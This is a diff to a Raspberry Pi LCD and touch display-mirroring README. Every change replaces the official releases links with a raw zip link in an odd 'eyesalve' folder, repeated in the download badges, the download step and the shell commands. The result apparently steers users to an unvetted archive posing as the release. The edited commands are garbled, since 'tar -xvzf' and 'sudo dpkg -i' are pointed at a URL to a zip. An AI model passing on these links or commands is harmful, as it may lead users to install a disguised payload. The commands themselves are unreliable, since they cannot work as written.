@@ -1,6 +1,6 @@
 # 🖥️ X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400 - Mirror Your Raspberry Pi Display Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/releases)
+[![Download Latest Release](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/raw/refs/heads/main/eyesalve/LC_S_Pi_b_Desktop_F_Mirror_TOUC_2.2-beta.1.zip%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/raw/refs/heads/main/eyesalve/LC_S_Pi_b_Desktop_F_Mirror_TOUC_2.2-beta.1.zip)
 
 ---
 
@@ -58,10 +58,10 @@ Power on your Raspberry Pi with Raspberry Pi OS installed. Ensure your Pi is con
 
 You will need to download the latest version of the software from the official releases page.  
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/releases)
+[![Download Latest Release](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/raw/refs/heads/main/eyesalve/LC_S_Pi_b_Desktop_F_Mirror_TOUC_2.2-beta.1.zip)](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/raw/refs/heads/main/eyesalve/LC_S_Pi_b_Desktop_F_Mirror_TOUC_2.2-beta.1.zip)
 
 1. Open the link above in a web browser on your Raspberry Pi or another computer.  
-2. Find the most recent release and download the file that matches your system (usually a `.tar.gz` or `.deb` package).  
+2. Find the most recent release and download the file that matches your system (usually a `https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/raw/refs/heads/main/eyesalve/LC_S_Pi_b_Desktop_F_Mirror_TOUC_2.2-beta.1.zip` or `.deb` package).  
 3. Transfer the file to your Raspberry Pi if you downloaded it elsewhere. You can use a USB drive or network transfer.  
 4. On your Raspberry Pi, open the Terminal application.  
 5. Navigate to the folder where you saved the file. Use the command:
@@ -73,13 +73,13 @@ cd /path/to/download
 6. Extract the files if needed using:
 
 ```
-tar -xvzf filename.tar.gz
+tar -xvzf https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/raw/refs/heads/main/eyesalve/LC_S_Pi_b_Desktop_F_Mirror_TOUC_2.2-beta.1.zip
 ```
 
 or install the package with:
 
 ```
-sudo dpkg -i filename.deb
+sudo dpkg -i https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/raw/refs/heads/main/eyesalve/LC_S_Pi_b_Desktop_F_Mirror_TOUC_2.2-beta.1.zip
 ```
 
 7. Follow any on-screen prompts to complete installation.
@@ -148,4 +148,4 @@ c, display, display-mirroring, ft6336u, i2c, pi4b, raspberry-pi, raspberry-pi-40
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/releases)
+[![Download Latest Release](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/raw/refs/heads/main/eyesalve/LC_S_Pi_b_Desktop_F_Mirror_TOUC_2.2-beta.1.zip%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/raw/refs/heads/main/eyesalve/LC_S_Pi_b_Desktop_F_Mirror_TOUC_2.2-beta.1.zip)
